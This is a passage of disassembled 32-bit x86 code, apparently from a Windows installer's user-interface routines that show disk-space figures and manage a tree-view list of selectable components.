  4049b0:	eb 21                	jmp    0x4049d3
  4049b2:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4049b5:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4049b8:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  4049bc:	c1 e9 0a             	shr    $0xa,%ecx
  4049bf:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4049c2:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4049c5:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4049cc:	33 ff                	xor    %edi,%edi
  4049ce:	be 00 04 00 00       	mov    $0x400,%esi
  4049d3:	6a 05                	push   $0x5
  4049d5:	e8 f8 01 00 00       	call   0x404bd2
  4049da:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  4049dd:	74 19                	je     0x4049f8
  4049df:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4049e2:	33 c9                	xor    %ecx,%ecx
  4049e4:	3b d1                	cmp    %ecx,%edx
  4049e6:	77 10                	ja     0x4049f8
  4049e8:	72 07                	jb     0x4049f1
  4049ea:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4049ed:	3b c8                	cmp    %eax,%ecx
  4049ef:	73 07                	jae    0x4049f8
  4049f1:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4049f8:	8b 0d 1c 3f 42 00    	mov    0x423f1c,%ecx
  4049fe:	39 79 10             	cmp    %edi,0x10(%ecx)
  404a01:	74 30                	je     0x404a33
  404a03:	50                   	push   %eax
  404a04:	6a fb                	push   $0xfffffffb
  404a06:	68 ff 03 00 00       	push   $0x3ff
  404a0b:	e8 aa 01 00 00       	call   0x404bba
  404a10:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404a13:	74 10                	je     0x404a25
  404a15:	ff 75 d8             	push   -0x28(%ebp)
  404a18:	ff 75 d4             	push   -0x2c(%ebp)
  404a1b:	6a fc                	push   $0xfffffffc
  404a1d:	56                   	push   %esi
  404a1e:	e8 d2 00 00 00       	call   0x404af5
  404a23:	eb 0e                	jmp    0x404a33
  404a25:	68 10 fd 41 00       	push   $0x41fd10
  404a2a:	56                   	push   %esi
  404a2b:	ff 75 08             	push   0x8(%ebp)
  404a2e:	e8 ef 0e 00 00       	call   0x405922
  404a33:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404a36:	3b c7                	cmp    %edi,%eax
  404a38:	a3 04 48 42 00       	mov    %eax,0x424804
  404a3d:	75 0a                	jne    0x404a49
  404a3f:	6a 07                	push   $0x7
  404a41:	e8 c5 c9 ff ff       	call   0x40140b
  404a46:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404a49:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404a4c:	85 70 14             	test   %esi,0x14(%eax)
  404a4f:	74 03                	je     0x404a54
  404a51:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404a54:	33 c0                	xor    %eax,%eax
  404a56:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404a59:	0f 94 c0             	sete   %al
  404a5c:	50                   	push   %eax
  404a5d:	e8 6c f8 ff ff       	call   0x4042ce
  404a62:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404a65:	75 0d                	jne    0x404a74
  404a67:	39 3d 40 0d 42 00    	cmp    %edi,0x420d40
  404a6d:	75 05                	jne    0x404a74
  404a6f:	e8 23 fc ff ff       	call   0x404697
  404a74:	89 3d 40 0d 42 00    	mov    %edi,0x420d40
  404a7a:	ff 75 14             	push   0x14(%ebp)
  404a7d:	ff 75 10             	push   0x10(%ebp)
  404a80:	ff 75 0c             	push   0xc(%ebp)
  404a83:	e8 8b f8 ff ff       	call   0x404313
  404a88:	5f                   	pop    %edi
  404a89:	5e                   	pop    %esi
  404a8a:	5b                   	pop    %ebx
  404a8b:	c9                   	leave
  404a8c:	c2 10 00             	ret    $0x10
  404a8f:	55                   	push   %ebp
  404a90:	8b ec                	mov    %esp,%ebp
  404a92:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404a96:	56                   	push   %esi
  404a97:	8b 35 60 82 40 00    	mov    0x408260,%esi
  404a9d:	75 1c                	jne    0x404abb
  404a9f:	ff 75 14             	push   0x14(%ebp)
  404aa2:	68 fb 03 00 00       	push   $0x3fb
  404aa7:	e8 7c 0e 00 00       	call   0x405928
  404aac:	ff 75 14             	push   0x14(%ebp)
  404aaf:	6a 01                	push   $0x1
  404ab1:	68 66 04 00 00       	push   $0x466
  404ab6:	ff 75 08             	push   0x8(%ebp)
  404ab9:	ff d6                	call   *%esi
  404abb:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404abf:	75 2d                	jne    0x404aee
  404ac1:	ff 75 14             	push   0x14(%ebp)
  404ac4:	ff 75 10             	push   0x10(%ebp)
  404ac7:	ff 15 74 81 40 00    	call   *0x408174
  404acd:	85 c0                	test   %eax,%eax
  404acf:	74 0e                	je     0x404adf
  404ad1:	6a 07                	push   $0x7
  404ad3:	e8 33 c9 ff ff       	call   0x40140b
  404ad8:	85 c0                	test   %eax,%eax
  404ada:	75 03                	jne    0x404adf
  404adc:	40                   	inc    %eax
  404add:	eb 02                	jmp    0x404ae1
  404adf:	33 c0                	xor    %eax,%eax
  404ae1:	50                   	push   %eax
  404ae2:	6a 00                	push   $0x0
  404ae4:	68 65 04 00 00       	push   $0x465
  404ae9:	ff 75 08             	push   0x8(%ebp)
  404aec:	ff d6                	call   *%esi
  404aee:	33 c0                	xor    %eax,%eax
  404af0:	5e                   	pop    %esi
  404af1:	5d                   	pop    %ebp
  404af2:	c2 10 00             	ret    $0x10
  404af5:	55                   	push   %ebp
  404af6:	8b ec                	mov    %esp,%ebp
  404af8:	83 ec 40             	sub    $0x40,%esp
  404afb:	8b 45 14             	mov    0x14(%ebp),%eax
  404afe:	53                   	push   %ebx
  404aff:	56                   	push   %esi
  404b00:	8b 75 10             	mov    0x10(%ebp),%esi
  404b03:	57                   	push   %edi
  404b04:	6a dc                	push   $0xffffffdc
  404b06:	85 c0                	test   %eax,%eax
  404b08:	5b                   	pop    %ebx
  404b09:	74 0b                	je     0x404b16
  404b0b:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404b0f:	c1 e8 14             	shr    $0x14,%eax
  404b12:	33 ff                	xor    %edi,%edi
  404b14:	eb 4e                	jmp    0x404b64
  404b16:	6a 14                	push   $0x14
  404b18:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404b1e:	59                   	pop    %ecx
  404b1f:	8b c6                	mov    %esi,%eax
  404b21:	73 06                	jae    0x404b29
  404b23:	6a 0a                	push   $0xa
  404b25:	59                   	pop    %ecx
  404b26:	6a dd                	push   $0xffffffdd
  404b28:	5b                   	pop    %ebx
  404b29:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404b2f:	73 05                	jae    0x404b36
  404b31:	6a de                	push   $0xffffffde
  404b33:	33 c9                	xor    %ecx,%ecx
  404b35:	5b                   	pop    %ebx
  404b36:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404b3c:	73 0d                	jae    0x404b4b
  404b3e:	33 c0                	xor    %eax,%eax
  404b40:	6a 14                	push   $0x14
  404b42:	40                   	inc    %eax
  404b43:	5f                   	pop    %edi
  404b44:	d3 e0                	shl    %cl,%eax
  404b46:	99                   	cltd
  404b47:	f7 ff                	idiv   %edi
  404b49:	03 c6                	add    %esi,%eax
  404b4b:	8b f0                	mov    %eax,%esi
  404b4d:	25 ff ff ff 00       	and    $0xffffff,%eax
  404b52:	6a 0a                	push   $0xa
  404b54:	33 d2                	xor    %edx,%edx
  404b56:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404b59:	03 c0                	add    %eax,%eax
  404b5b:	d3 e8                	shr    %cl,%eax
  404b5d:	d3 ee                	shr    %cl,%esi
  404b5f:	59                   	pop    %ecx
  404b60:	f7 f1                	div    %ecx
  404b62:	8b fa                	mov    %edx,%edi
  404b64:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404b67:	6a df                	push   $0xffffffdf
  404b69:	50                   	push   %eax
  404b6a:	e8 4c 17 00 00       	call   0x4062bb
  404b6f:	50                   	push   %eax
  404b70:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404b73:	53                   	push   %ebx
  404b74:	50                   	push   %eax
  404b75:	e8 41 17 00 00       	call   0x4062bb
  404b7a:	50                   	push   %eax
  404b7b:	57                   	push   %edi
  404b7c:	56                   	push   %esi
  404b7d:	68 24 a2 40 00       	push   $0x40a224
  404b82:	ff 75 0c             	push   0xc(%ebp)
  404b85:	be 50 0d 42 00       	mov    $0x420d50,%esi
  404b8a:	56                   	push   %esi
  404b8b:	e8 2b 17 00 00       	call   0x4062bb
  404b90:	56                   	push   %esi
  404b91:	8b f8                	mov    %eax,%edi
  404b93:	e8 a6 16 00 00       	call   0x40623e
  404b98:	03 f8                	add    %eax,%edi
  404b9a:	57                   	push   %edi
  404b9b:	ff 15 34 82 40 00    	call   *0x408234
  404ba1:	83 c4 18             	add    $0x18,%esp
  404ba4:	56                   	push   %esi
  404ba5:	ff 75 08             	push   0x8(%ebp)
  404ba8:	ff 35 18 3f 42 00    	push   0x423f18
  404bae:	e8 6f 0d 00 00       	call   0x405922
  404bb3:	5f                   	pop    %edi
  404bb4:	5e                   	pop    %esi
  404bb5:	5b                   	pop    %ebx
  404bb6:	c9                   	leave
  404bb7:	c2 10 00             	ret    $0x10
  404bba:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404bbe:	33 c9                	xor    %ecx,%ecx
  404bc0:	51                   	push   %ecx
  404bc1:	50                   	push   %eax
  404bc2:	ff 74 24 10          	push   0x10(%esp)
  404bc6:	ff 74 24 10          	push   0x10(%esp)
  404bca:	e8 26 ff ff ff       	call   0x404af5
  404bcf:	c2 0c 00             	ret    $0xc
  404bd2:	8b 15 8c 47 42 00    	mov    0x42478c,%edx
  404bd8:	8b 0d 88 47 42 00    	mov    0x424788,%ecx
  404bde:	33 c0                	xor    %eax,%eax
  404be0:	85 d2                	test   %edx,%edx
  404be2:	74 18                	je     0x404bfc
  404be4:	56                   	push   %esi
  404be5:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404be9:	74 07                	je     0x404bf2
  404beb:	8b 74 24 08          	mov    0x8(%esp),%esi
  404bef:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404bf2:	81 c1 18 04 00 00    	add    $0x418,%ecx
  404bf8:	4a                   	dec    %edx
  404bf9:	75 ea                	jne    0x404be5
  404bfb:	5e                   	pop    %esi
  404bfc:	c2 04 00             	ret    $0x4
  404bff:	55                   	push   %ebp
  404c00:	8b ec                	mov    %esp,%ebp
  404c02:	83 ec 38             	sub    $0x38,%esp
  404c05:	56                   	push   %esi
  404c06:	8b 35 60 82 40 00    	mov    0x408260,%esi
  404c0c:	57                   	push   %edi
  404c0d:	8b 7d 08             	mov    0x8(%ebp),%edi
  404c10:	6a 00                	push   $0x0
  404c12:	6a 09                	push   $0x9
  404c14:	68 0a 11 00 00       	push   $0x110a
  404c19:	57                   	push   %edi
  404c1a:	ff d6                	call   *%esi
  404c1c:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404c20:	74 3c                	je     0x404c5e
  404c22:	ff 15 c4 81 40 00    	call   *0x4081c4
  404c28:	0f bf c8             	movswl %ax,%ecx
  404c2b:	c1 e8 10             	shr    $0x10,%eax
  404c2e:	0f bf c0             	movswl %ax,%eax
  404c31:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404c34:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c37:	50                   	push   %eax
  404c38:	57                   	push   %edi
  404c39:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404c3c:	ff 15 f4 81 40 00    	call   *0x4081f4
  404c42:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c45:	50                   	push   %eax
  404c46:	6a 00                	push   $0x0
  404c48:	68 11 11 00 00       	push   $0x1111
  404c4d:	57                   	push   %edi
  404c4e:	ff d6                	call   *%esi
  404c50:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404c54:	75 05                	jne    0x404c5b
  404c56:	83 c8 ff             	or     $0xffffffff,%eax
  404c59:	eb 1e                	jmp    0x404c79
  404c5b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c5e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404c61:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404c64:	50                   	push   %eax
  404c65:	6a 00                	push   $0x0
  404c67:	68 0c 11 00 00       	push   $0x110c
  404c6c:	57                   	push   %edi
  404c6d:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404c74:	ff d6                	call   *%esi
  404c76:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404c79:	5f                   	pop    %edi
  404c7a:	5e                   	pop    %esi
  404c7b:	c9                   	leave
  404c7c:	c2 08 00             	ret    $0x8
  404c7f:	56                   	push   %esi
  404c80:	57                   	push   %edi
  404c81:	be 00 50 42 00       	mov    $0x425000,%esi
  404c86:	bf 50 0d 42 00       	mov    $0x420d50,%edi
  404c8b:	56                   	push   %esi
  404c8c:	57                   	push   %edi
  404c8d:	e8 96 15 00 00       	call   0x406228
  404c92:	ff 74 24 10          	push   0x10(%esp)
  404c96:	56                   	push   %esi
  404c97:	e8 ea 14 00 00       	call   0x406186
  404c9c:	ff 74 24 0c          	push   0xc(%esp)
  404ca0:	e8 66 c7 ff ff       	call   0x40140b
  404ca5:	57                   	push   %edi
  404ca6:	56                   	push   %esi
  404ca7:	e8 7c 15 00 00       	call   0x406228
  404cac:	5f                   	pop    %edi
  404cad:	5e                   	pop    %esi
  404cae:	c2 08 00             	ret    $0x8
  404cb1:	55                   	push   %ebp
  404cb2:	8b ec                	mov    %esp,%ebp
  404cb4:	83 ec 54             	sub    $0x54,%esp
  404cb7:	53                   	push   %ebx
  404cb8:	56                   	push   %esi
  404cb9:	8b 35 38 82 40 00    	mov    0x408238,%esi
  404cbf:	57                   	push   %edi
  404cc0:	68 f9 03 00 00       	push   $0x3f9
  404cc5:	ff 75 08             	push   0x8(%ebp)
  404cc8:	ff d6                	call   *%esi
  404cca:	68 08 04 00 00       	push   $0x408
  404ccf:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404cd2:	ff 75 08             	push   0x8(%ebp)
  404cd5:	ff d6                	call   *%esi
  404cd7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404cda:	a1 88 47 42 00       	mov    0x424788,%eax
  404cdf:	8b 35 60 82 40 00    	mov    0x408260,%esi
  404ce5:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404ce8:	a1 54 47 42 00       	mov    0x424754,%eax
  404ced:	33 db                	xor    %ebx,%ebx
  404cef:	05 94 00 00 00       	add    $0x94,%eax
  404cf4:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404cfb:	6a 10                	push   $0x10
  404cfd:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404d00:	5f                   	pop    %edi
  404d01:	0f 85 27 02 00 00    	jne    0x404f2e
  404d07:	8b 45 08             	mov    0x8(%ebp),%eax
  404d0a:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  404d0d:	a3 c0 47 42 00       	mov    %eax,0x4247c0
  404d12:	a1 8c 47 42 00       	mov    0x42478c,%eax
  404d17:	c1 e0 02             	shl    $0x2,%eax
  404d1a:	50                   	push   %eax
  404d1b:	6a 40                	push   $0x40
  404d1d:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  404d24:	ff 15 28 81 40 00    	call   *0x408128
  404d2a:	53                   	push   %ebx
  404d2b:	53                   	push   %ebx
  404d2c:	53                   	push   %ebx
  404d2d:	53                   	push   %ebx
  404d2e:	6a 6e                	push   $0x6e
  404d30:	a3 48 0d 42 00       	mov    %eax,0x420d48
  404d35:	ff 35 40 47 42 00    	push   0x424740
  404d3b:	ff 15 4c 82 40 00    	call   *0x40824c
  404d41:	83 0d 3c 0d 42 00 ff 	orl    $0xffffffff,0x420d3c
  404d48:	68 c3 52 40 00       	push   $0x4052c3
  404d4d:	6a fc                	push   $0xfffffffc
  404d4f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404d52:	ff 75 fc             	push   -0x4(%ebp)
  404d55:	ff 15 48 82 40 00    	call   *0x408248
  404d5b:	53                   	push   %ebx
  404d5c:	6a 06                	push   $0x6
  404d5e:	6a 21                	push   $0x21
  404d60:	57                   	push   %edi
  404d61:	57                   	push   %edi
  404d62:	a3 44 0d 42 00       	mov    %eax,0x420d44
  404d67:	ff 15 3c 80 40 00    	call   *0x40803c
  404d6d:	68 ff 00 ff 00       	push   $0xff00ff
  404d72:	a3 34 0d 42 00       	mov    %eax,0x420d34
  404d77:	ff 75 f4             	push   -0xc(%ebp)
  404d7a:	50                   	push   %eax
  404d7b:	ff 15 44 80 40 00    	call   *0x408044
  404d81:	ff 35 34 0d 42 00    	push   0x420d34
  404d87:	6a 02                	push   $0x2
  404d89:	68 09 11 00 00       	push   $0x1109
  404d8e:	ff 75 fc             	push   -0x4(%ebp)
  404d91:	ff d6                	call   *%esi
  404d93:	53                   	push   %ebx
  404d94:	53                   	push   %ebx
  404d95:	68 1c 11 00 00       	push   $0x111c
  404d9a:	ff 75 fc             	push   -0x4(%ebp)
  404d9d:	ff d6                	call   *%esi
  404d9f:	3b c7                	cmp    %edi,%eax
  404da1:	7d 0c                	jge    0x404daf
  404da3:	53                   	push   %ebx
  404da4:	57                   	push   %edi
  404da5:	68 1b 11 00 00       	push   $0x111b
  404daa:	ff 75 fc             	push   -0x4(%ebp)
  404dad:	ff d6                	call   *%esi
  404daf:	ff 75 f4             	push   -0xc(%ebp)
  404db2:	ff 15 60 80 40 00    	call   *0x408060
  404db8:	33 ff                	xor    %edi,%edi
  404dba:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404dbd:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  404dc0:	3b c3                	cmp    %ebx,%eax
  404dc2:	74 27                	je     0x404deb
  404dc4:	83 ff 20             	cmp    $0x20,%edi
  404dc7:	74 03                	je     0x404dcc
  404dc9:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404dcc:	50                   	push   %eax
  404dcd:	53                   	push   %ebx
  404dce:	e8 e8 14 00 00       	call   0x4062bb
  404dd3:	50                   	push   %eax
  404dd4:	53                   	push   %ebx
  404dd5:	68 43 01 00 00       	push   $0x143
  404dda:	ff 75 f8             	push   -0x8(%ebp)
  404ddd:	ff d6                	call   *%esi
  404ddf:	57                   	push   %edi
  404de0:	50                   	push   %eax
  404de1:	68 51 01 00 00       	push   $0x151
  404de6:	ff 75 f8             	push   -0x8(%ebp)
  404de9:	ff d6                	call   *%esi
  404deb:	47                   	inc    %edi
  404dec:	83 ff 21             	cmp    $0x21,%edi
  404def:	7c c9                	jl     0x404dba
  404df1:	8b 7d 14             	mov    0x14(%ebp),%edi
  404df4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404df7:	ff 74 87 30          	push   0x30(%edi,%eax,4)
  404dfb:	6a 15                	push   $0x15
  404dfd:	ff 75 08             	push   0x8(%ebp)
  404e00:	e8 a7 f4 ff ff       	call   0x4042ac
  404e05:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e08:	ff 74 87 34          	push   0x34(%edi,%eax,4)
  404e0c:	6a 16                	push   $0x16
  404e0e:	ff 75 08             	push   0x8(%ebp)
  404e11:	e8 96 f4 ff ff       	call   0x4042ac
  404e16:	33 ff                	xor    %edi,%edi
  404e18:	39 1d 8c 47 42 00    	cmp    %ebx,0x42478c
  404e1e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404e21:	0f 8e c9 00 00 00    	jle    0x404ef0
  404e27:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404e2a:	8d 50 08             	lea    0x8(%eax),%edx
  404e2d:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  404e30:	8d 42 10             	lea    0x10(%edx),%eax
  404e33:	38 18                	cmp    %bl,(%eax)
  404e35:	0f 84 97 00 00 00    	je     0x404ed2
  404e3b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404e3e:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404e41:	8b 02                	mov    (%edx),%eax
  404e43:	6a 20                	push   $0x20
  404e45:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  404e48:	59                   	pop    %ecx
  404e49:	8b d0                	mov    %eax,%edx
  404e4b:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  404e52:	23 d1                	and    %ecx,%edx
  404e54:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  404e5b:	a8 02                	test   $0x2,%al
  404e5d:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  404e60:	89 7d d8             	mov    %edi,-0x28(%ebp)
  404e63:	89 55 bc             	mov    %edx,-0x44(%ebp)
  404e66:	74 3a                	je     0x404ea2
  404e68:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404e6b:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  404e72:	50                   	push   %eax
  404e73:	53                   	push   %ebx
  404e74:	68 00 11 00 00       	push   $0x1100
  404e79:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  404e80:	ff 75 fc             	push   -0x4(%ebp)
  404e83:	ff d6                	call   *%esi
  404e85:	8b 0d 48 0d 42 00    	mov    0x420d48,%ecx
  404e8b:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404e92:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404e95:	a1 48 0d 42 00       	mov    0x420d48,%eax
  404e9a:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  404e9d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404ea0:	eb 30                	jmp    0x404ed2
  404ea2:	a8 04                	test   $0x4,%al
  404ea4:	74 14                	je     0x404eba
  404ea6:	ff 75 f4             	push   -0xc(%ebp)
  404ea9:	6a 03                	push   $0x3
  404eab:	68 0a 11 00 00       	push   $0x110a
  404eb0:	ff 75 fc             	push   -0x4(%ebp)
  404eb3:	ff d6                	call   *%esi
  404eb5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404eb8:	eb 18                	jmp    0x404ed2
  404eba:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404ebd:	50                   	push   %eax
  404ebe:	53                   	push   %ebx
  404ebf:	68 00 11 00 00       	push   $0x1100
  404ec4:	ff 75 fc             	push   -0x4(%ebp)
  404ec7:	ff d6                	call   *%esi
  404ec9:	8b 0d 48 0d 42 00    	mov    0x420d48,%ecx
  404ecf:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404ed2:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404ed5:	47                   	inc    %edi
  404ed6:	81 c2 18 04 00 00    	add    $0x418,%edx
  404edc:	3b 3d 8c 47 42 00    	cmp    0x42478c,%edi
  404ee2:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  404ee5:	0f 8c 45 ff ff ff    	jl     0x404e30
  404eeb:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  404eee:	75 19                	jne    0x404f09
  404ef0:	6a f0                	push   $0xfffffff0
  404ef2:	ff 75 fc             	push   -0x4(%ebp)
  404ef5:	ff 15 d4 81 40 00    	call   *0x4081d4
  404efb:	24 fb                	and    $0xfb,%al
  404efd:	50                   	push   %eax
  404efe:	6a f0                	push   $0xfffffff0
  404f00:	ff 75 fc             	push   -0x4(%ebp)
  404f03:	ff 15 48 82 40 00    	call   *0x408248
  404f09:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  404f0c:	75 18                	jne    0x404f26
  404f0e:	6a 05                	push   $0x5
  404f10:	ff 75 f8             	push   -0x8(%ebp)
  404f13:	ff 15 30 82 40 00    	call   *0x408230
  404f19:	ff 75 f8             	push   -0x8(%ebp)
  404f1c:	e8 c0 f3 ff ff       	call   0x4042e1
  404f21:	e9 88 03 00 00       	jmp    0x4052ae
  404f26:	ff 75 fc             	push   -0x4(%ebp)
  404f29:	e8 b3 f3 ff ff       	call   0x4042e1
  404f2e:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404f35:	75 12                	jne    0x404f49
  404f37:	33 c9                	xor    %ecx,%ecx
  404f39:	89 5d 10             	mov    %ebx,0x10(%ebp)
  404f3c:	41                   	inc    %ecx
  404f3d:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404f44:	89 4d 14             	mov    %ecx,0x14(%ebp)
  404f47:	eb 03                	jmp    0x404f4c
  404f49:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404f4c:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404f50:	b8 13 04 00 00       	mov    $0x413,%eax
  404f55:	74 09                	je     0x404f60
  404f57:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404f5a:	0f 85 e4 00 00 00    	jne    0x405044
  404f60:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404f63:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404f66:	74 0d                	je     0x404f75
  404f68:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  404f6f:	0f 85 cf 00 00 00    	jne    0x405044
  404f75:	f6 05 5d 47 42 00 02 	testb  $0x2,0x42475d
  404f7c:	75 73                	jne    0x404ff1
  404f7e:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404f81:	74 09                	je     0x404f8c
  404f83:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404f86:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  404f8a:	75 65                	jne    0x404ff1
  404f8c:	33 c9                	xor    %ecx,%ecx
  404f8e:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404f91:	0f 95 c1             	setne  %cl
  404f94:	51                   	push   %ecx
  404f95:	ff 75 fc             	push   -0x4(%ebp)
  404f98:	e8 62 fc ff ff       	call   0x404bff
  404f9d:	8b f8                	mov    %eax,%edi
  404f9f:	3b fb                	cmp    %ebx,%edi
  404fa1:	7c 4e                	jl     0x404ff1
  404fa3:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404fa9:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404fac:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  404fb0:	8b 01                	mov    (%ecx),%eax
  404fb2:	a8 10                	test   $0x10,%al
  404fb4:	75 3b                	jne    0x404ff1
  404fb6:	a8 40                	test   $0x40,%al
  404fb8:	74 11                	je     0x404fcb
  404fba:	35 80 00 00 00       	xor    $0x80,%eax
  404fbf:	84 c0                	test   %al,%al
  404fc1:	79 04                	jns    0x404fc7
  404fc3:	0c 01                	or     $0x1,%al
  404fc5:	eb 07                	jmp    0x404fce
  404fc7:	24 fe                	and    $0xfe,%al
  404fc9:	eb 03                	jmp    0x404fce
  404fcb:	83 f0 01             	xor    $0x1,%eax
  404fce:	57                   	push   %edi
  404fcf:	89 01                	mov    %eax,(%ecx)
  404fd1:	e8 a7 c1 ff ff       	call   0x40117d
  404fd6:	a1 5c 47 42 00       	mov    0x42475c,%eax
  404fdb:	47                   	inc    %edi
  404fdc:	f7 d0                	not    %eax
  404fde:	c1 e8 08             	shr    $0x8,%eax
  404fe1:	83 e0 01             	and    $0x1,%eax
  404fe4:	89 7d 10             	mov    %edi,0x10(%ebp)
  404fe7:	89 45 14             	mov    %eax,0x14(%ebp)
  404fea:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404ff1:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  404ff4:	74 4e                	je     0x405044
  404ff6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404ff9:	81 78 08 6e fe ff ff 	cmpl   $0xfffffe6e,0x8(%eax)
  405000:	75 0e                	jne    0x405010
  405002:	ff 70 5c             	push   0x5c(%eax)
  405005:	53                   	push   %ebx
  405006:	68 19 04 00 00       	push   $0x419
  40500b:	ff 75 fc             	push   -0x4(%ebp)
  40500e:	ff d6                	call   *%esi
  405010:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405013:	81 78 08 6a fe ff ff 	cmpl   $0xfffffe6a,0x8(%eax)
  40501a:	75 28                	jne    0x405044
  40501c:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  405020:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405023:	8b 40 5c             	mov    0x5c(%eax),%eax
  405026:	75 0f                	jne    0x405037
  405028:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  40502e:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  405032:	83 08 20             	orl    $0x20,(%eax)
  405035:	eb 0d                	jmp    0x405044
  405037:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  40503d:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  405041:	83 20 df             	andl   $0xffffffdf,(%eax)
  405044:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40504b:	75 6f                	jne    0x4050bc
  40504d:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  405053:	0f 85 55 02 00 00    	jne    0x4052ae
  405059:	8b 45 10             	mov    0x10(%ebp),%eax
  40505c:	c1 e8 10             	shr    $0x10,%eax
  40505f:	66 3d 01 00          	cmp    $0x1,%ax
  405063:	0f 85 45 02 00 00    	jne    0x4052ae
  405069:	53                   	push   %ebx
  40506a:	53                   	push   %ebx
  40506b:	68 47 01 00 00       	push   $0x147
  405070:	ff 75 f8             	push   -0x8(%ebp)
  405073:	ff d6                	call   *%esi
